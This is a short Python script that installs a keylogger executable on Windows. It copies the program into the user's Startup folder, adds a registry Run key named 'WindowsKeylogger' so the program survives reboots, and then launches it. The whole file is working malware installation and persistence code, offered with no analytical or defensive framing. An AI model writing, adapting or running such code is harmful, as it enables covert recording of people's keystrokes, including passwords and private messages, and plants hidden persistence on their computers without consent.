import os
import shutil
import subprocess
import winreg as reg

def install_keylogger():
    # Path to the keylogger executable
    exe_name = "windows_keylogger.exe"
    # Destination path where the keylogger will be moved
    destination_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', exe_name)

    # Copy the keylogger to the startup directory
    shutil.copyfile(exe_name, destination_path)

    # Add the keylogger to the registry for persistence
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "WindowsKeylogger", 0, reg.REG_SZ, destination_path)
    reg.CloseKey(reg_key)

    # Run the keylogger
    subprocess.Popen([destination_path], shell=True)

if __name__ == "__main__":
    install_keylogger()
